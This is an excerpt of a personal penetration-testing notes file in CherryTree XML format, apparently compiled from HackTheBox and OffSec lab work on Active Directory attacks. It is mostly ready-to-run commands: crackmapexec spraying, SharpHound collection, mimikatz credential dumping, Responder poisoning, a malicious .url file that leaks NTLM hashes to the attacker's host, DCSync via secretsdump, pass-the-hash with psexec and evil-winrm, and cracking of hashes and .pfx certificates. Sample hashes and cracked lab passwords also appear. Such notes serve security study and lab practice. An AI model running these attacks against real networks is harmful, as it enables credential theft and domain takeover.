          <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.169</codebox>
          <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.169 -u &lt;username&gt; -p &lt;password&gt; --shares

Ex:

crackmapexec smb 10.10.10.169 -u admin -p abcd1234 --shares</codebox>
          <codebox char_offset="120" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.169 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="150" justification="left" frame_width="610" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> crackmapexec smb 10.10.10.169 --shares
 </codebox>
          <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.169 --shares -u '' -p ''</codebox>
          <codebox char_offset="231" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.169 --shares -u 'randomanon' -p ''</codebox>
          <codebox char_offset="239" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.169 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="267" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec winrm 10.10.10.169 -u users.txt -H hashes.txt</codebox>
          <codebox char_offset="297" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.169 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808</codebox>
          <codebox char_offset="328" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Crackmapexec -d domain.local -u username -p password --shares</codebox>
          <codebox char_offset="329" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
</codebox>
          <codebox char_offset="372" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.169 -u validuser.txt -p password.txt -M spider-plus </codebox>
          <codebox char_offset="373" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
          <codebox char_offset="470" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 10.10.10.169  -u validuser.txt -p password.txt -M spider-plus --no-bruteforce</codebox>
          <codebox char_offset="531" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.169  -u validuser.txt -p password.txt -M spider-plus --continue-on-success</codebox>
          <codebox char_offset="634" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ldap 10.10.10.169 -u &lt;username&gt; -p &lt;password&gt; --kdcHost 10.10.10.169 -M laps</codebox>
          <codebox char_offset="687" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.10.169 -u patrick -p /usr/share/wordlists/rockyou.txt</codebox>
        </node>
        <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1698807551">
          <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For Domain Joined simply run

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else

____________________________________________________


using Powershell to run sharphound/bloodhound on target machine

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
_______________________________________________


</rich_text>
          <rich_text scale="h3">running bloodhound from attack machine using python</rich_text>
          <rich_text>

First install via
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

then


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

OR 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



where </rich_text>
          <rich_text family="monospace">ns</rich_text>
          <rich_text> is the name server aka dns

</rich_text>
          <rich_text scale="h3">To get more infor use:</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where -c is for collection all


_________________________________________________________________________________________


</rich_text>
          <rich_text scale="h2">Running the console</rich_text>
          <rich_text>

To view all the json files generated by the commands above :

1.  Start bloodhound via : </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
2. Start neo4j console: </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
3.  Use Default password as neo4j/neo4j

4. Upload all the Json Files or drop the zip file

5. First always check the pwned users and mark them owned before checking anything else

6.Click on the left side and click on Analysis
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


7. Select : </rich_text>
          <rich_text weight="heavy">Shortest Paths to High Value Targets</rich_text>
          <rich_text>  see that view
 
8. Check the machine u have access to and see the shortest path. or path from owned users and select Domain Admin

9. click on the joining arrows, select help and then abuse to see how it can be achieved
   
</rich_text>
          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 10.10.10.169</codebox>
          <codebox char_offset="127" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe</codebox>
          <codebox char_offset="596" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">upload SharpHound.ps1&#13;
Import-Module ./SharpHound.ps1&#13;
Invoke-Bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</codebox>
          <codebox char_offset="719" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo apt install bloodhound.py</codebox>
          <codebox char_offset="729" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.10.169 -d support.htb -u 'ldap' -p 'password'</codebox>
          <codebox char_offset="737" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -c all  -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.169 -d htb.local -gc forest.htb.local</codebox>
          <codebox char_offset="803" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.10.169 -d support.htb -u 'ldap' -p 'password' -c all</codebox>
          <codebox char_offset="1042" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo bloodhound</codebox>
          <codebox char_offset="1072" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo neo4j console</codebox>
          <encoded_png char_offset="1302" justification="left" link="webs https://juggernaut-sec.com/wp-content/uploads/2022/05/8442901667a85bf701cabc4f8b9d7d3e.png"></encoded_png>
        </node>
        <node name="MIMIKATZ" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688334012" ts_lastsave="1688335156">
          <rich_text underline="single" weight="heavy">Mimikatz Commands:</rich_text>
          <rich_text>
&#13;&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#logonpasswords">logonpasswords</rich_text>
          <rich_text>: </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::logonpasswords</rich_text>
          <rich_text>)&#13;&#13;◇ Extracts passwords in memory
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth">pth</rich_text>
          <rich_text> (pass the hash):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</rich_text>
          <rich_text>&#13;&#13;◇ A fake identity is created and the faske identitt’s NTLM hash is replaced with the real one.
&#13;◇ “ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable)”
&#13;◇ “AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.”
&#13;
&#13;
&#13;• ptt (pass the ticket):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # kerberos::ptt</rich_text>
          <rich_text>&#13;&#13;◇ Enables Kerberos ticket (TGT or TGS) injection into the current session.
&#13;
&#13;
&#13;• tickets:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::tickets /export</rich_text>
          <rich_text>&#13;&#13;◇ Identifies all session Kerberos tickets and lists/exports them.
&#13;◇ sekurlsa pulls the Kerberos data from memory and can access all user session tickets on the computer.
&#13;
&#13;
&#13;• ekeys:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::ekeys</rich_text>
          <rich_text>&#13;&#13;◇ Extract the Kerberos ekeys from memory. Provides theft of a user &#13;account until the password is changed (which may be never for a &#13;Smartcard/PKI user).
&#13;
&#13;
&#13;• dpapi:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::dpapi</rich_text>
          <rich_text>
&#13;• minidump:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::minidump lsass.dmp</rich_text>
          <rich_text>&#13;&#13;◇ Perform a minidump of the LSASS process and extract credential data &#13;from the lsass.dmp. A minidump can be saved off the computer for &#13;credential extraction later, but the major version of Windows must match&#13; (you can’t open the dump file from Windows 2012 on a Windows 2008 &#13;system).
&#13;
&#13;
&#13;• kerberos:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::kerberos</rich_text>
          <rich_text>&#13;&#13;◇ &#13; Extracts the smartcad/PIV PIN from memory (cached in LSASS when using a smartcard).&#13;
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege">debug:</rich_text>
          <rich_text>&#13;mimikatz # privilege::debug&#13;&#13;◇ Sets debug mode for current mimikatz session enabling LSASS access.
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=en&amp;ie=UTF8&amp;prev=_t&amp;rurl=translate.google.com&amp;sl=fr&amp;tl=en&amp;u=http://blog.gentilkiwi.com/securite/mscache-v2-dcc2-iteration&amp;usg=ALkJrhjpLNpxdAk-QbYsP-iApIcsLGHdWA">lsadump cache</rich_text>
          <rich_text>: (requires token::elevate to be SYSTEM)&#13;mimikatz # lsadump::cache&#13;&#13;◇ Dumps cached Windows domain credentials from HKEY_LOCAL_MACHINE\SECURITY\Cache (accessible SYSTEM).

</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
&#13;
&#13;
&#13;
</rich_text>
        </node>
        <node name="Responder" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689197133" ts_lastsave="1689283651">
          <rich_text scale="h1">
LLMNR/NBT-NS/mDNS Poisoner


</rich_text>
          <rich_text scale="h2">Basic Usage:</rich_text>
          <rich_text>

Run:

sudo responder -I tun0
or 


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


or


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


And then made victim perform actions (send queries via ssrf) to posion
When a client tries to resolve a name not in the DNS, Responder will poison the LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) and spoof SMB Request in order to grab NetNTLMv2 hash.

Reference:
</rich_text>
          <rich_text link="webs https://juggernaut-sec.com/llmnr-poisoning-responder/">https://juggernaut-sec.com/llmnr-poisoning-responder/</rich_text>
          <codebox char_offset="79" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wv</codebox>
          <codebox char_offset="88" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wvfr</codebox>
        </node>
        <node name="Remote Shells for Windows" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689198163" ts_lastsave="1689286554">
          <rich_text>

</rich_text>
          <rich_text link="node 86">psexec - Passthe HAsh</rich_text>
          <rich_text>


</rich_text>
          <rich_text link="node 95">evilwinrm</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1690067048">
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where u make sure the hash is the second part of  the hash:

ex: 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



</rich_text>
          <rich_text scale="h2">Option</rich_text>
          <rich_text>


If u want to run a file on ur local kali linux directly use `-s`  option followed by  `directory location`

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

now if u have PowerView.ps1 on ur local kali/attacker machine u can run it directly on windows system


References:
1. </rich_text>
          <rich_text link="webs https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/">https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/</rich_text>
          <rich_text>
2. </rich_text>
          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</rich_text>
          <codebox char_offset="1" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -u '&lt;user&gt;' -p &lt;password&gt; -i 10.10.10.169</codebox>
          <codebox char_offset="8" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.169 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f8</codebox>
          <codebox char_offset="79" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;hash not to use&gt;:&lt;hash to actually use&gt;</codebox>
          <codebox char_offset="201" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.169 -u anirudh -p "SecureHM" -s .</codebox>
        </node>
        <node name="URI File Attack" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690061701" ts_lastsave="1690061750">
          <rich_text>
</rich_text>
          <rich_text scale="h2">URI File Attack</rich_text>
          <rich_text>
&#13;As this is a Windows host, we can use the SMB share access&#13;  to upload a file that the target system will interpret as a Windows &#13; shortcut. In this file, we can specify an icon that points to our Kali &#13; host. This should allow us to capture the user's NTLM hash when it is &#13; accessed.
&#13;We'll create a file named @hax.url with the following contents.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;When a user accesses this file, it will attempt to load &#13; the icon. This will cause a request to our Kali host for a file named &#13; with the user account's username. This request should also contain the &#13; NTLM hash of this account.
&#13;Before uploading the file to the SMB share, let's start responder to listen for the request.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;Next, let's upload our file.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;Nice, we successfully obtained the NTLM hash for a user named anirudh.&#13; User Password Brute-Force
&#13;Let's save this hash to a file and attempt to crack it using john and the rockyou.txt wordlist.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="370" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ cat @hax.url &#13;
[InternetShortcut]&#13;
URL=anything&#13;
WorkingDirectory=anything&#13;
IconFile=\\192.168.118.14\%USERNAME%.icon&#13;
IconIndex=1</codebox>
          <codebox char_offset="700" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ sudo responder -I tun0 -v&#13;
...&#13;
[+] Listening for events...&#13;
...</codebox>
          <codebox char_offset="735" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">...&#13;
smb: \&gt; put @hax.url &#13;
putting file @hax.url as \@hax.url (1.2 kb/s) (average 1.2 kb/s)&#13;
smb: \&gt; quit&#13;
&#13;
┌──(kali㉿kali)-[~]&#13;
└─$&#13;

&#13;After a little while, responder captures a hash.
&#13;[SMB] NTLMv2-SSP Client   : 192.168.120.116&#13;
[SMB] NTLMv2-SSP Username : VAULT\anirudh&#13;
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:9def1316e1ccodebox>
          <codebox char_offset="936" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ cat hash.txt &#13;
anirudh::VAULT:9def1316e1c
&#13;
┌──(kali㉿kali)-[~]&#13;
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt&#13;
Using default input encoding: UTF-8&#13;
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])&#13;
Will run 4 OpenMP threads&#13;
Press 'q' or Ctrl-C to abort, almost any other key for status&#13;
SecureHM         (anirudh)     &#13;
1g 0:00:00:03 DONE (2021-11-19 13:09) 0.2564g/s 2720Kp/s 2720Kc/s 2720KC/s Seifer@14..Schsutar90&#13;
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably&#13;
Session completed. </codebox>
        </node>
        <node name="Powerview" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696729392" ts_lastsave="1696730835">
          <rich_text>USing powerview

Download it:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Start power shell first:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Usage:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

To start PowerView

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

ref: </rich_text>
          <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/powershell/powerview/">https://exploit-notes.hdks.org/exploit/windows/powershell/powerview/</rich_text>
          <codebox char_offset="30" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</codebox>
          <codebox char_offset="59" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe</codebox>
          <codebox char_offset="70" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Import-Module .\PowerView.ps1</codebox>
          <codebox char_offset="93" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">. .\PowerView.ps1</codebox>
        </node>
        <node name="DACL/DC-Sync" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696734710" ts_lastsave="1697146362">
          <rich_text>check the Forest writeup for priv esc

</rich_text>
          <rich_text link="webs https://sevenlayers.com/index.php/313-hackthebox-forest-walkthrough">https://sevenlayers.com/index.php/313-hackthebox-forest-walkthrough</rich_text>
          <rich_text>
</rich_text>
          <rich_text link="webs https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521">https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521</rich_text>
          <rich_text>



PS:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


once u get the hash use it
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <codebox char_offset="186" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump htb.local/user:pass@10.10.10.169</codebox>
          <codebox char_offset="217" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.169 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e</codebox>
          <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.169 -u administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</codebox>
        </node>
        <node name="RPCClient" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698812150" ts_lastsave="1698812302">
          <rich_text>

</rich_text>
          <rich_text link="webs https://www.hackingarticles.in/active-directory-enumeration-rpcclient/">https://www.hackingarticles.in/active-directory-enumeration-rpcclient/</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="75" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">rpcclient 10.10.10.169 -U support</codebox>
        </node>
        <node name="Certificates" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707553317" ts_lastsave="1707658693">
          <rich_text>if you have a .pfx file from AD that uses LAPS (</rich_text>
          <rich_text link="webs https://int64software.com/blog/2019/08/22/installing-and-configuring-microsoft-laps-a-complete-guide-part-2/">https://int64software.com/blog/2019/08/22/installing-and-configuring-microsoft-laps-a-complete-guide-part-2/</rich_text>
          <rich_text>)

you  bruteforce the password via john by:

first converting it to john format
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
then bruteforcing it via john like

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

then u can extract keys from the pfx file via:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 

here use the password u cracked from john and then add PEM password of your choice

this is the private key


you can extract the certificate also from the pfx file using

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

once u have both the .crt and .key file u can run evil winrm to get the shell via 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


________________________________________________________________________


PS : Similarly instead of .pfx file if u have crt and key u can do the same thing</rich_text>
          <codebox char_offset="237" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> pfx2john your_pfx_file.pfx &gt; pfx2johnoutput.txt        </codebox>
          <codebox char_offset="275" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=/usr/share/wordlists/rockyou.txt pfx2johnoutput.txt</codebox>
          <codebox char_offset="276" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
          <codebox char_offset="327" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">openssl pkcs12 -in your_pfx_file.pfx -nocerts -out prv.key</codebox>
          <codebox char_offset="503" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">openssl pkcs12 -in your_pfx_file.pfx -clcerts -nokeys -out cert.crt </codebox>
          <codebox char_offset="590" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> evil-winrm -i 10.10.10.169 -c ./cert.crt -k ./prv.key -p -u -S</codebox>
        </node>
        <node name="ldap" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1710613798" ts_lastsave="1710613934">
          <rich_text>1. </rich_text>
          <rich_text link="node 45">ldapsearch</rich_text>
          <rich_text>
2. </rich_text>
          <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1710613809">
            <rich_text scale="h3">Using Ldapsearch</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

or
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or 

Without any user:

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


once u have the output make sure u check log file for 

1.  </rich_text>
            <rich_text weight="heavy">Passwords</rich_text>
            <rich_text> via :
   </rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
2.  </rich_text>
            <rich_text weight="heavy">Usernames</rich_text>
            <rich_text> Via:
   </rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


_________________________________________________________________


</rich_text>
            <rich_text scale="h2">To check for admin</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -H ldap://10.10.10.169 -D ‘luser@support.htb’ -w 'password' -b 'dc=support,dc=htb'</codebox>
            <codebox char_offset="24" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -v -x -D &lt;user&gt;@HUTCH.OFFSEC -w &lt;password&gt; -b "DC=hutch,DC=offsec" -H ldap://10.10.10.169</codebox>
            <codebox char_offset="50" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://10.10.10.169 | tee ldapSearch.log  </codebox>
            <codebox char_offset="133" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat ldapSearch.log| grep -i password</codebox>
            <codebox char_offset="157" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep 'sAMAccountName:' ldapSearch.log

or

grep 'userPrincipalName:' ldapsearch/ldapSearch_Guest.log   </codebox>
            <codebox char_offset="249" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -v -x -D &lt;user&gt;@HUTCH.OFFSEC -w &lt;password&gt; -b "DC=hutch,DC=offsec" -H ldap://10.10.10.169 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd</codebox>
          </node>
          <node name="ldapdomaindump" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1710613934" ts_lastsave="1710620292">
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

ex:
here the domain is </rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text> so  the command is

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>  

once u have the dump look for a user  then check if 
- this password was reused by the person who set the password. and
- also who is the domain admin

</rich_text>
